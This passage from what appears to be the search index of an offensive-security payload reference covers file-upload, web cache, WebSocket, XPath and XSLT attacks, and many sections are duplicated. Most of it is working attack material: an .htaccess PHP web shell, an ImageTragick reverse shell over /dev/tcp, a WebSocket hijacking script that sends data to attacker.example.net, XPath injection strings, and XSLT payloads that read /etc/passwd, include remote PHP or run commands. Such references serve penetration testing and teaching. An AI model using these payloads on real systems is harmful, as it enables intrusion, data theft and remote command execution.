FFmpeg processes .txt files in a special way. It tries to show a screen capture of a tty printing this file. So, the playlist above will be processed as follows: FFmpeg sees #EXTM3U signature inside GAB2 chunk and determines file type as HLS playlist. The file GOD.txt doesn't even exist, but it's name is enough for FFmpeg to detect file type as .txt. FFmpeg concatenates the contents of all segments of the playlist. As only one of two segments actually exists, the result of concatenation is just the contents of the file we want to retrieve. Because the type of this concatenation is .txt, FFmpeg draws a tty that prints the file.","title":"How it works (Explanations from neex - Hackerone links)"},{"location":"Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS/#thanks-to","text":"Hackerone - Local File Disclosure via ffmpeg @sxcurity Hackerone - Another local file disclosure via ffmpeg PHDays - Attacks on video converters:a year later, Emil Lerner, Pavel Cheremushkin Script by @neex","title":"Thanks to"},{"location":"Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/","text":".htaccess upload Uploading an .htaccess file to override Apache rule and execute PHP. \"Hackers can also use \u201c.htaccess\u201d file tricks to upload a malicious file with any extension and execute it. For a simple example, imagine uploading to the vulnerabler server an .htaccess file that has AddType application/x-httpd-php .htaccess configuration and also contains PHP shellcode. Because of the malicious .htaccess file, the web server considers the .htaccess file as an executable php file and executes its malicious PHP shellcode. One thing to note: .htaccess configurations are applicable only for the same directory and sub-directories where the .htaccess file is uploaded.\" Self contained .htaccess web shell # Self contained .htaccess web shell - Part of the htshell project # Written by Wireghoul - http://www.justanotherhacker.com # Override default deny rule to make .htaccess file accessible over web <Files ~ \"^\\.ht\"> Order allow,deny Allow from all </Files> # Make .htaccess file be interpreted as php file. This occur after apache has interpreted # the apache directoves from the .htaccess file AddType application/x-httpd-php .htaccess ###### SHELL ###### <?php echo \"\\n\";passthru($_GET['c'].\" 2>&1\"); ?> .htaccess upload as image If the exif_imagetype function is used on the server side to determine the image type, create a .htaccess/image polyglot. Supported image types include X BitMap (XBM) and WBMP . In .htaccess ignoring lines starting with \\x00 and # , you can use these scripts for generate a valid .htaccess/image polyglot. # create valid .htaccess/xbm image width = 50 height = 50 payload = '# .htaccess file' with open('.htaccess', 'w') as htaccess: htaccess.write('#define test_width %d\\n' % (width, )) htaccess.write('#define test_height %d\\n' % (height, )) htaccess.write(payload) or # create valid .htaccess/wbmp image type_header = b'\\x00' fixed_header = b'\\x00' width = b'50' height = b'50' payload = b'# .htaccess file' with open('.htaccess', 'wb') as htaccess: htaccess.write(type_header + fixed_header + width + height) htaccess.write(b'\\n') htaccess.write(payload) Thanks to ATTACKING WEBSERVERS VIA .HTACCESS - By Eldar Marcussen Protection from Unrestricted File Upload Vulnerability Writeup to l33t-hoster task, Insomnihack Teaser 2019","title":".htaccess upload"},{"location":"Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/#htaccess-upload","text":"Uploading an .htaccess file to override Apache rule and execute PHP. \"Hackers can also use \u201c.htaccess\u201d file tricks to upload a malicious file with any extension and execute it. For a simple example, imagine uploading to the vulnerabler server an .htaccess file that has AddType application/x-httpd-php .htaccess configuration and also contains PHP shellcode. Because of the malicious .htaccess file, the web server considers the .htaccess file as an executable php file and executes its malicious PHP shellcode. One thing to note: .htaccess configurations are applicable only for the same directory and sub-directories where the .htaccess file is uploaded.\" Self contained .htaccess web shell # Self contained .htaccess web shell - Part of the htshell project # Written by Wireghoul - http://www.justanotherhacker.com # Override default deny rule to make .htaccess file accessible over web <Files ~ \"^\\.ht\"> Order allow,deny Allow from all </Files> # Make .htaccess file be interpreted as php file. This occur after apache has interpreted # the apache directoves from the .htaccess file AddType application/x-httpd-php .htaccess ###### SHELL ###### <?php echo \"\\n\";passthru($_GET['c'].\" 2>&1\"); ?>","title":".htaccess upload"},{"location":"Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/#htaccess-upload-as-image","text":"If the exif_imagetype function is used on the server side to determine the image type, create a .htaccess/image polyglot. Supported image types include X BitMap (XBM) and WBMP . In .htaccess ignoring lines starting with \\x00 and # , you can use these scripts for generate a valid .htaccess/image polyglot. # create valid .htaccess/xbm image width = 50 height = 50 payload = '# .htaccess file' with open('.htaccess', 'w') as htaccess: htaccess.write('#define test_width %d\\n' % (width, )) htaccess.write('#define test_height %d\\n' % (height, )) htaccess.write(payload) or # create valid .htaccess/wbmp image type_header = b'\\x00' fixed_header = b'\\x00' width = b'50' height = b'50' payload = b'# .htaccess file' with open('.htaccess', 'wb') as htaccess: htaccess.write(type_header + fixed_header + width + height) htaccess.write(b'\\n') htaccess.write(payload)","title":".htaccess upload as image"},{"location":"Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/#thanks-to","text":"ATTACKING WEBSERVERS VIA .HTACCESS - By Eldar Marcussen Protection from Unrestricted File Upload Vulnerability Writeup to l33t-hoster task, Insomnihack Teaser 2019","title":"Thanks to"},{"location":"Upload%20Insecure%20Files/Configuration%20Busybox%20httpd.conf/","text":"If you have upload access to a non /cgi-bin folder - upload a httpd.conf and configure your own interpreter. Details from Busybox httpd.c https://github.com/brgl/busybox/blob/abbf17abccbf832365d9acf1c280369ba7d5f8b2/networking/httpd.c#L60 *.php:/path/php # run xxx.php through an interpreter` If a sub directory contains config file, it is parsed and merged with any existing settings as if it was appended to the original configuration. Watch out for Windows CRLF line endings messing up your payload (you will just get 404 errors) - you cant see these in Burp :)","title":"Index"},{"location":"Upload%20Insecure%20Files/Extension%20Flash/","text":"XSS via SWF As you may already know, it is possible to make a website vulnerable to XSS if you can upload/include a SWF file into that website. I am going to represent this SWF file that you can use in your PoCs. This method is based on [1] and [2], and it has been tested in Google Chrome, Mozilla Firefox, IE9/8; there should not be any problem with other browsers either. Browsers other than IE: http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain); IE8: http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(\u2018?js=history.go(-1)\u2019,\u2019_self\u2019);} IE9: http://0me.me/demo/xss/xssproject.swf?js=w=window.open(\u2018invalidfileinvalidfileinvalidfile\u2019,\u2019target\u2019);setTimeout(\u2018alert(w.document.location);w.close();\u2019,1);","title":"Index"},{"location":"Upload%20Insecure%20Files/Extension%20Flash/#xss-via-swf","text":"As you may already know, it is possible to make a website vulnerable to XSS if you can upload/include a SWF file into that website. I am going to represent this SWF file that you can use in your PoCs. This method is based on [1] and [2], and it has been tested in Google Chrome, Mozilla Firefox, IE9/8; there should not be any problem with other browsers either. Browsers other than IE: http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain); IE8: http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(\u2018?js=history.go(-1)\u2019,\u2019_self\u2019);} IE9: http://0me.me/demo/xss/xssproject.swf?js=w=window.open(\u2018invalidfileinvalidfileinvalidfile\u2019,\u2019target\u2019);setTimeout(\u2018alert(w.document.location);w.close();\u2019,1);","title":"XSS via SWF"},{"location":"Upload%20Insecure%20Files/Picture%20Image%20Magik/","text":"Image Tragik 1 & 2 Exploit v1 Simple reverse shell push graphic-context encoding \"UTF-8\" viewbox 0 0 1 1 affine 1 0 0 1 0 0 push graphic-context image Over 0,0 1,1 '|/bin/sh -i > /dev/tcp/ip/80 0<&1 2>&1' pop graphic-context pop graphic-context Exploit v2 Simple id payload %!PS userdict /setpagedevice undef save legal { null restore } stopped { pop } if { legal } stopped { pop } if restore mark /OutputFile (%pipe%id) currentdevice putdeviceprops then use convert shellexec.jpeg whatever.gif Thanks to openwall.com/lists/oss-security/2018/08/21/2 by Tavis Ormandy","title":"Image Tragik 1 & 2"},{"location":"Upload%20Insecure%20Files/Picture%20Image%20Magik/#image-tragik-1-2","text":"","title":"Image Tragik 1 &amp; 2"},{"location":"Upload%20Insecure%20Files/Picture%20Image%20Magik/#exploit-v1","text":"Simple reverse shell push graphic-context encoding \"UTF-8\" viewbox 0 0 1 1 affine 1 0 0 1 0 0 push graphic-context image Over 0,0 1,1 '|/bin/sh -i > /dev/tcp/ip/80 0<&1 2>&1' pop graphic-context pop graphic-context","title":"Exploit v1"},{"location":"Upload%20Insecure%20Files/Picture%20Image%20Magik/#exploit-v2","text":"Simple id payload %!PS userdict /setpagedevice undef save legal { null restore } stopped { pop } if { legal } stopped { pop } if restore mark /OutputFile (%pipe%id) currentdevice putdeviceprops then use convert shellexec.jpeg whatever.gif","title":"Exploit v2"},{"location":"Upload%20Insecure%20Files/Picture%20Image%20Magik/#thanks-to","text":"openwall.com/lists/oss-security/2018/08/21/2 by Tavis Ormandy","title":"Thanks to"},{"location":"Upload%20Insecure%20Files/Zip%20Slip/","text":"Zip Slip The vulnerability is exploited using a specially crafted archive that holds directory traversal filenames (e.g. ../../shell.php). The Zip Slip vulnerability can affect numerous archive formats, including tar, jar, war, cpio, apk, rar and 7z. The attacker can then overwrite executable files and either invoke them remotely or wait for the system or user to call them, thus achieving remote command execution on the victim\u2019s machine. Summary Detection Tools Exploits Basic Exploit Additional Notes Detection Any zip upload page on the application Tools evilarc https://github.com/ptoomey3/evilarc Exploits Basic Exploit python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15 Additional Notes For affected libraries and projects, visit https://github.com/snyk/zip-slip-vulnerability References Zip Slip Vulnerability - Snyk Ltd, 2019 Zip Slip - snyk, 2019","title":"Zip Slip"},{"location":"Upload%20Insecure%20Files/Zip%20Slip/#zip-slip","text":"The vulnerability is exploited using a specially crafted archive that holds directory traversal filenames (e.g. ../../shell.php). The Zip Slip vulnerability can affect numerous archive formats, including tar, jar, war, cpio, apk, rar and 7z. The attacker can then overwrite executable files and either invoke them remotely or wait for the system or user to call them, thus achieving remote command execution on the victim\u2019s machine.","title":"Zip Slip"},{"location":"Upload%20Insecure%20Files/Zip%20Slip/#summary","text":"Detection Tools Exploits Basic Exploit Additional Notes","title":"Summary"},{"location":"Upload%20Insecure%20Files/Zip%20Slip/#detection","text":"Any zip upload page on the application","title":"Detection"},{"location":"Upload%20Insecure%20Files/Zip%20Slip/#tools","text":"evilarc https://github.com/ptoomey3/evilarc","title":"Tools"},{"location":"Upload%20Insecure%20Files/Zip%20Slip/#exploits","text":"","title":"Exploits"},{"location":"Upload%20Insecure%20Files/Zip%20Slip/#basic-exploit","text":"python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15","title":"Basic Exploit"},{"location":"Upload%20Insecure%20Files/Zip%20Slip/#additional-notes","text":"For affected libraries and projects, visit https://github.com/snyk/zip-slip-vulnerability","title":"Additional Notes"},{"location":"Upload%20Insecure%20Files/Zip%20Slip/#references","text":"Zip Slip Vulnerability - Snyk Ltd, 2019 Zip Slip - snyk, 2019","title":"References"},{"location":"Web%20Cache%20Deception/","text":"Web Cache Deception Attack Tools Param Miner - PortSwigger > This extension identifies hidden, unlinked parameters. It's particularly useful for finding web cache poisoning vulnerabilities. Exploit Browser requests http://www.example.com/home.php/non-existent.css . Server returns the content of http://www.example.com/home.php , most probably with HTTP caching headers that instruct to not cache this page. The response goes through the proxy. The proxy identifies that the file has a css extension. Under the cache directory, the proxy creates a directory named home.php, and caches the imposter \"CSS\" file (non-existent.css) inside. Methodology of the attack - example Normal browsing, visit home : https://www.example.com/myaccount/home/ Open the malicious link : https://www.example.com/myaccount/home/malicious.css The page is displayed as /home and the cache is saving the page Open a private tab with the previous URL : https://www.paypal.com/myaccount/home/malicous.css The content of the cache is displayed Video of the attack by Omer Gil - Web Cache Deception Attack in PayPal Home Page Methodology 2 Find an un-keyed input for a Cache Poisoning js Values: User-Agent Values: Cookie Header: X-Forwarded-Host Header: X-Host Header: X-Forwarded-Server Header: X-Forwarded-Scheme (header; also in combination with X-Forwarded-Host) Header: X-Original-URL (Symfony) Header: X-Rewrite-URL (Symfony) Cache poisoning attack - Example for X-Forwarded-Host un-keyed input (remember to use a buster to only cache this webpage instead of the main page of the website) ```js GET /test?buster=123 HTTP/1.1 Host: target.com X-Forwarded-Host: test\"> alert(1) HTTP/1.1 200 OK Cache-Control: public, no-cache [..] alert(1) \"> ``` References Web Cache Deception Attack - Omer Gil Practical Web Cache Poisoning - James Kettle @albinowax Web Cache Entanglement: Novel Pathways to Poisoning - James Kettle @albinowax Web Cache Deception Attack leads to user info disclosure - Kunal pandey - Feb 25 Web cache poisoning - Web Security Academy learning materials Exploiting cache design flaws Exploiting cache implementation flaws","title":"Web Cache Deception Attack"},{"location":"Web%20Cache%20Deception/#web-cache-deception-attack","text":"","title":"Web Cache Deception Attack"},{"location":"Web%20Cache%20Deception/#tools","text":"Param Miner - PortSwigger > This extension identifies hidden, unlinked parameters. It's particularly useful for finding web cache poisoning vulnerabilities.","title":"Tools"},{"location":"Web%20Cache%20Deception/#exploit","text":"Browser requests http://www.example.com/home.php/non-existent.css . Server returns the content of http://www.example.com/home.php , most probably with HTTP caching headers that instruct to not cache this page. The response goes through the proxy. The proxy identifies that the file has a css extension. Under the cache directory, the proxy creates a directory named home.php, and caches the imposter \"CSS\" file (non-existent.css) inside.","title":"Exploit"},{"location":"Web%20Cache%20Deception/#methodology-of-the-attack-example","text":"Normal browsing, visit home : https://www.example.com/myaccount/home/ Open the malicious link : https://www.example.com/myaccount/home/malicious.css The page is displayed as /home and the cache is saving the page Open a private tab with the previous URL : https://www.paypal.com/myaccount/home/malicous.css The content of the cache is displayed Video of the attack by Omer Gil - Web Cache Deception Attack in PayPal Home Page","title":"Methodology of the attack - example"},{"location":"Web%20Cache%20Deception/#methodology-2","text":"Find an un-keyed input for a Cache Poisoning js Values: User-Agent Values: Cookie Header: X-Forwarded-Host Header: X-Host Header: X-Forwarded-Server Header: X-Forwarded-Scheme (header; also in combination with X-Forwarded-Host) Header: X-Original-URL (Symfony) Header: X-Rewrite-URL (Symfony) Cache poisoning attack - Example for X-Forwarded-Host un-keyed input (remember to use a buster to only cache this webpage instead of the main page of the website) ```js GET /test?buster=123 HTTP/1.1 Host: target.com X-Forwarded-Host: test\"> alert(1) HTTP/1.1 200 OK Cache-Control: public, no-cache [..] alert(1) \"> ```","title":"Methodology 2"},{"location":"Web%20Cache%20Deception/#references","text":"Web Cache Deception Attack - Omer Gil Practical Web Cache Poisoning - James Kettle @albinowax Web Cache Entanglement: Novel Pathways to Poisoning - James Kettle @albinowax Web Cache Deception Attack leads to user info disclosure - Kunal pandey - Feb 25 Web cache poisoning - Web Security Academy learning materials Exploiting cache design flaws Exploiting cache implementation flaws","title":"References"},{"location":"Web%20Sockets/","text":"Web Sockets Attacks The WebSocket protocol allows a bidirectional and full-duplex communication between a client and a server Summary Tools Using ws-harness.py Tools ws-harness.py Using ws-harness.py Start ws-harness to listen on a web-socket, and specify a message template to send to the endpoint. python ws-harness.py -u \"ws://dvws.local:8080/authenticate-user\" -m ./message.txt The content of the message should contains the [FUZZ] keyword. {\"auth_user\":\"dGVzda==\", \"auth_pass\":\"[FUZZ]\"} Then you can use any tools against the newly created web service, working as a proxy and tampering on the fly the content of message sent thru the websocket. sqlmap -u http://127.0.0.1:8000/?fuzz=test --tables --tamper=base64encode --dump Cross-Site WebSocket Hijacking (CSWSH) If the WebSocket handshake is not correctly protected using a CSRF token or a nonce, it's possible to use the authenticated WebSocket of a user on an attacker's controlled site because the cookies are automatically sent by the browser. This attack is called Cross-Site WebSocket Hijacking (CSWSH). Example exploit, hosted on an attacker's server, that exfiltrates the received data from the WebSocket to the attacker: <script> ws = new WebSocket('wss://vulnerable.example.com/messages'); ws.onopen = function start(event) { ws.send(\"HELLO\"); } ws.onmessage = function handleReply(event) { fetch('https://attacker.example.net/?'+event.data, {mode: 'no-cors'}); } ws.send(\"Some text sent to the server\"); </script> You have to adjust the code to your exact situation. E.g. if your web application uses a Sec-WebSocket-Protocol header in the handshake request, you have to add this value as a 2nd parameter to the WebSocket function call in order to add this header. References HACKING WEB SOCKETS: ALL WEB PENTEST TOOLS WELCOMED by Michael Fowl | Mar 5, 2019 Hacking with WebSockets - Qualys - Mike Shema, Sergey Shekyan, Vaagn Toukharian Mini WebSocket CTF - January 27, 2020 - Snowscan","title":"Web Sockets Attacks"},{"location":"Web%20Sockets/#web-sockets-attacks","text":"The WebSocket protocol allows a bidirectional and full-duplex communication between a client and a server","title":"Web Sockets Attacks"},{"location":"Web%20Sockets/#summary","text":"Tools Using ws-harness.py","title":"Summary"},{"location":"Web%20Sockets/#tools","text":"ws-harness.py","title":"Tools"},{"location":"Web%20Sockets/#using-ws-harnesspy","text":"Start ws-harness to listen on a web-socket, and specify a message template to send to the endpoint. python ws-harness.py -u \"ws://dvws.local:8080/authenticate-user\" -m ./message.txt The content of the message should contains the [FUZZ] keyword. {\"auth_user\":\"dGVzda==\", \"auth_pass\":\"[FUZZ]\"} Then you can use any tools against the newly created web service, working as a proxy and tampering on the fly the content of message sent thru the websocket. sqlmap -u http://127.0.0.1:8000/?fuzz=test --tables --tamper=base64encode --dump","title":"Using ws-harness.py"},{"location":"Web%20Sockets/#cross-site-websocket-hijacking-cswsh","text":"If the WebSocket handshake is not correctly protected using a CSRF token or a nonce, it's possible to use the authenticated WebSocket of a user on an attacker's controlled site because the cookies are automatically sent by the browser. This attack is called Cross-Site WebSocket Hijacking (CSWSH). Example exploit, hosted on an attacker's server, that exfiltrates the received data from the WebSocket to the attacker: <script> ws = new WebSocket('wss://vulnerable.example.com/messages'); ws.onopen = function start(event) { ws.send(\"HELLO\"); } ws.onmessage = function handleReply(event) { fetch('https://attacker.example.net/?'+event.data, {mode: 'no-cors'}); } ws.send(\"Some text sent to the server\"); </script> You have to adjust the code to your exact situation. E.g. if your web application uses a Sec-WebSocket-Protocol header in the handshake request, you have to add this value as a 2nd parameter to the WebSocket function call in order to add this header.","title":"Cross-Site WebSocket Hijacking (CSWSH)"},{"location":"Web%20Sockets/#references","text":"HACKING WEB SOCKETS: ALL WEB PENTEST TOOLS WELCOMED by Michael Fowl | Mar 5, 2019 Hacking with WebSockets - Qualys - Mike Shema, Sergey Shekyan, Vaagn Toukharian Mini WebSocket CTF - January 27, 2020 - Snowscan","title":"References"},{"location":"XPATH%20Injection/","text":"XPATH injection XPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents. Summary Exploitation Blind exploitation Out Of Band Exploitation Tools References Exploitation Similar to SQL : \"string(//user[name/text()='\" +vuln_var1+ \"' and password/text()=\u2019\" +vuln_var1+ \"']/account/text())\" ' or '1'='1 ' or ''=' x' or 1=1 or 'x'='y / // //* */* @* count(/child::node()) x' or name()='username' or 'x'='y ' and count(/*)=1 and '1'='1 ' and count(/@*)=1 and '1'='1 ' and count(/comment())=1 and '1'='1 search=')] | //user/*[contains(*,' search=Har') and contains(../password,'c search=Har') and starts-with(../password,'c Blind Exploitation Size of a string sql and string-length(account)=SIZE_INT Extract a character sql substring(//user[userid=5]/username,2,1)=CHAR_HERE substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE) Out Of Band Exploitation http://example.com/?title=Foundation&type=*&rent_days=* and doc('//10.10.10.10/SHARE') Tools xcat - Automate XPath injection attacks to retrieve documents xxxpwn - Advanced XPath Injection Tool xxxpwn_smart - A fork of xxxpwn using predictive text xpath-blind-explorer XmlChor - Xpath injection exploitation tool References OWASP XPATH Injection Places of Interest in Stealing NetNTLM Hashes - Osanda Malith Jayathissa - March 24, 2017","title":"XPATH injection"},{"location":"XPATH%20Injection/#xpath-injection","text":"XPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents.","title":"XPATH injection"},{"location":"XPATH%20Injection/#summary","text":"Exploitation Blind exploitation Out Of Band Exploitation Tools References","title":"Summary"},{"location":"XPATH%20Injection/#exploitation","text":"Similar to SQL : \"string(//user[name/text()='\" +vuln_var1+ \"' and password/text()=\u2019\" +vuln_var1+ \"']/account/text())\" ' or '1'='1 ' or ''=' x' or 1=1 or 'x'='y / // //* */* @* count(/child::node()) x' or name()='username' or 'x'='y ' and count(/*)=1 and '1'='1 ' and count(/@*)=1 and '1'='1 ' and count(/comment())=1 and '1'='1 search=')] | //user/*[contains(*,' search=Har') and contains(../password,'c search=Har') and starts-with(../password,'c","title":"Exploitation"},{"location":"XPATH%20Injection/#blind-exploitation","text":"Size of a string sql and string-length(account)=SIZE_INT Extract a character sql substring(//user[userid=5]/username,2,1)=CHAR_HERE substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)","title":"Blind Exploitation"},{"location":"XPATH%20Injection/#out-of-band-exploitation","text":"http://example.com/?title=Foundation&type=*&rent_days=* and doc('//10.10.10.10/SHARE')","title":"Out Of Band Exploitation"},{"location":"XPATH%20Injection/#tools","text":"xcat - Automate XPath injection attacks to retrieve documents xxxpwn - Advanced XPath Injection Tool xxxpwn_smart - A fork of xxxpwn using predictive text xpath-blind-explorer XmlChor - Xpath injection exploitation tool","title":"Tools"},{"location":"XPATH%20Injection/#references","text":"OWASP XPATH Injection Places of Interest in Stealing NetNTLM Hashes - Osanda Malith Jayathissa - March 24, 2017","title":"References"},{"location":"XSLT%20Injection/","text":"XSLT Injection Processing an un-validated XSL stylesheet can allow an attacker to change the structure and contents of the resultant XML, include arbitrary files from the file system, or execute arbitrary code Summary XSLT Injection Summary Tools Exploit Determine the vendor and version External Entity Read files and SSRF using document Remote Code Execution with Embedded Script Blocks Remote Code Execution with PHP wrapper Remote Code Execution with Java Remote Code Execution with Native .NET References Tools Exploit Determine the vendor and version <?xml version=\"1.0\" encoding=\"utf-8\"?> <xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"> <xsl:template match=\"/fruits\"> <xsl:value-of select=\"system-property('xsl:vendor')\"/> </xsl:template> </xsl:stylesheet> <?xml version=\"1.0\" encoding=\"UTF-8\"?> <html xsl:version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\"> <body> <br />Version: <xsl:value-of select=\"system-property('xsl:version')\" /> <br />Vendor: <xsl:value-of select=\"system-property('xsl:vendor')\" /> <br />Vendor URL: <xsl:value-of select=\"system-property('xsl:vendor-url')\" /> </body> </html> External Entity <?xml version=\"1.0\" encoding=\"utf-8\"?> <!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM \"C:\\secretfruit.txt\">]> <xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"> <xsl:template match=\"/fruits\"> Fruits &ext_file;: <!-- Loop for each fruit --> <xsl:for-each select=\"fruit\"> <!-- Print name: description --> - <xsl:value-of select=\"name\"/>: <xsl:value-of select=\"description\"/> </xsl:for-each> </xsl:template> </xsl:stylesheet> Read files and SSRF using document <?xml version=\"1.0\" encoding=\"utf-8\"?> <xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"> <xsl:template match=\"/fruits\"> <xsl:copy-of select=\"document('http://172.16.132.1:25')\"/> <xsl:copy-of select=\"document('/etc/passwd')\"/> <xsl:copy-of select=\"document('file:///c:/winnt/win.ini')\"/> Fruits: <!-- Loop for each fruit --> <xsl:for-each select=\"fruit\"> <!-- Print name: description --> - <xsl:value-of select=\"name\"/>: <xsl:value-of select=\"description\"/> </xsl:for-each> </xsl:template> </xsl:stylesheet> Remote Code Execution with Embedded Script Blocks <?xml version=\"1.0\" encoding=\"UTF-8\"?> <xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\" xmlns:user=\"urn:my-scripts\"> <msxsl:script language = \"C#\" implements-prefix = \"user\"> <![CDATA[ public string execute(){ System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName= \"C:\\\\windows\\\\system32\\\\cmd.exe\"; proc.StartInfo.RedirectStandardOutput = true; proc.StartInfo.UseShellExecute = false; proc.StartInfo.Arguments = \"/c dir\"; proc.Start(); proc.WaitForExit(); return proc.StandardOutput.ReadToEnd(); } ]]> </msxsl:script> <xsl:template match=\"/fruits\"> --- BEGIN COMMAND OUTPUT --- <xsl:value-of select=\"user:execute()\"/> --- END COMMAND OUTPUT --- </xsl:template> </xsl:stylesheet> Remote Code Execution with PHP wrapper Execute the function readfile . <?xml version=\"1.0\" encoding=\"UTF-8\"?> <html xsl:version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\"> <body> <xsl:value-of select=\"php:function('readfile','index.php')\" /> </body> </html> Execute the function scandir . <xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\" version=\"1.0\"> <xsl:template match=\"/\"> <xsl:value-of name=\"assert\" select=\"php:function('scandir', '.')\"/> </xsl:template> </xsl:stylesheet> Execute a remote php file using assert <?xml version=\"1.0\" encoding=\"UTF-8\"?> <html xsl:version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\"> <body style=\"font-family:Arial;font-size:12pt;background-color:#EEEEEE\"> <xsl:variable name=\"payload\"> include(\"http://10.10.10.10/test.php\") </xsl:variable> <xsl:variable name=\"include\" select=\"php:function('assert',$payload)\"/> </body> </html> Execute a PHP meterpreter using PHP wrapper. <xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\" version=\"1.0\"> <xsl:template match=\"/\"> <xsl:variable name=\"eval\"> eval(base64_decode('Base64-encoded Meterpreter code')) </xsl:variable> <xsl:variable name=\"preg\" select=\"php:function('preg_replace', '/.*/e', $eval, '')\"/> </xsl:template> </xsl:stylesheet> Remote Code Execution with Java <xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:rt=\"http://xml.apache.org/xalan/java/java.lang.Runtime\" xmlns:ob=\"http://xml.apache.org/xalan/java/java.lang.Object\"> <xsl:template match=\"/\"> <xsl:variable name=\"rtobject\" select=\"rt:getRuntime()\"/> <xsl:variable name=\"process\" select=\"rt:exec($rtobject,'ls')\"/> <xsl:variable name=\"processString\" select=\"ob:toString($process)\"/> <xsl:value-of select=\"$processString\"/> </xsl:template> </xsl:stylesheet> <xml version=\"1.0\"?> <xsl:stylesheet version=\"2.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:java=\"http://saxon.sf.net/java-type\"> <xsl:template match=\"/\"> <xsl:value-of select=\"Runtime:exec(Runtime:getRuntime(),'cmd.exe /C ping IP')\" xmlns:Runtime=\"java:java.lang.Runtime\"/> </xsl:template>. </xsl:stylesheet> Remote Code Execution with Native .NET <xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\" xmlns:App=\"http://www.tempuri.org/App\"> <msxsl:script implements-prefix=\"App\" language=\"C#\"> <![CDATA[ public string ToShortDateString(string date) { System.Diagnostics.Process.Start(\"cmd.exe\"); return \"01/01/2001\"; } ]]> </msxsl:script> <xsl:template match=\"ArrayOfTest\"> <TABLE> <xsl:for-each select=\"Test\"> <TR> <TD> <xsl:value-of select=\"App:ToShortDateString(TestDate)\" /> </TD> </TR> </xsl:for-each> </TABLE> </xsl:template> </xsl:stylesheet> References From XSLT code execution to Meterpreter shells - 02 July 2012 - @agarri XSLT Injection - Fortify XSLT Injection Basics - Saxon","title":"XSLT Injection"},{"location":"XSLT%20Injection/#xslt-injection","text":"Processing an un-validated XSL stylesheet can allow an attacker to change the structure and contents of the resultant XML, include arbitrary files from the file system, or execute arbitrary code","title":"XSLT Injection"},{"location":"XSLT%20Injection/#summary","text":"XSLT Injection Summary Tools Exploit Determine the vendor and version External Entity Read files and SSRF using document Remote Code Execution with Embedded Script Blocks Remote Code Execution with PHP wrapper Remote Code Execution with Java Remote Code Execution with Native .NET References","title":"Summary"},{"location":"XSLT%20Injection/#tools","text":"","title":"Tools"},{"location":"XSLT%20Injection/#exploit","text":"","title":"Exploit"},{"location":"XSLT%20Injection/#determine-the-vendor-and-version","text":"<?xml version=\"1.0\" encoding=\"utf-8\"?> <xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"> <xsl:template match=\"/fruits\"> <xsl:value-of select=\"system-property('xsl:vendor')\"/> </xsl:template> </xsl:stylesheet> <?xml version=\"1.0\" encoding=\"UTF-8\"?> <html xsl:version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\"> <body> <br />Version: <xsl:value-of select=\"system-property('xsl:version')\" /> <br />Vendor: <xsl:value-of select=\"system-property('xsl:vendor')\" /> <br />Vendor URL: <xsl:value-of select=\"system-property('xsl:vendor-url')\" /> </body> </html>","title":"Determine the vendor and version"},{"location":"XSLT%20Injection/#external-entity","text":"<?xml version=\"1.0\" encoding=\"utf-8\"?> <!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM \"C:\\secretfruit.txt\">]> <xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"> <xsl:template match=\"/fruits\"> Fruits &ext_file;: <!-- Loop for each fruit --> <xsl:for-each select=\"fruit\"> <!-- Print name: description --> - <xsl:value-of select=\"name\"/>: <xsl:value-of select=\"description\"/> </xsl:for-each> </xsl:template> </xsl:stylesheet>","title":"External Entity"},{"location":"XSLT%20Injection/#read-files-and-ssrf-using-document","text":"<?xml version=\"1.0\" encoding=\"utf-8\"?> <xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"> <xsl:template match=\"/fruits\"> <xsl:copy-of select=\"document('http://172.16.132.1:25')\"/> <xsl:copy-of select=\"document('/etc/passwd')\"/> <xsl:copy-of 